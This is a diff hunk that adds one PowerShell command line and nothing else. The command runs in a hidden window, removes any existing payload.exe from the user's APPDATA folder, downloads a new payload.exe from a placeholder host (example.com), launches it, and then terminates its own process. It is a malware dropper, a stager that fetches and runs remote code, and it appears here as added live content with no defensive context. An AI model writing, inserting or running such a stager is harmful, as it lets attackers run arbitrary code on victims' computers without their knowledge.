@@ -1,0 +1,2 @@
+powershell.exe -WindowStyle Hidden -noprofile If (test-path $env:APPDATA + '\payload.exe') {Remove-Item $env:APPDATA + '\payload.exe'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'USR-KL'; $OEKQD.DownloadFile('http://example.com/payload.exe', $env:APPDATA + '\payload.exe'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\payload.exe'); Stop-Process -Id $Pid -Force
+
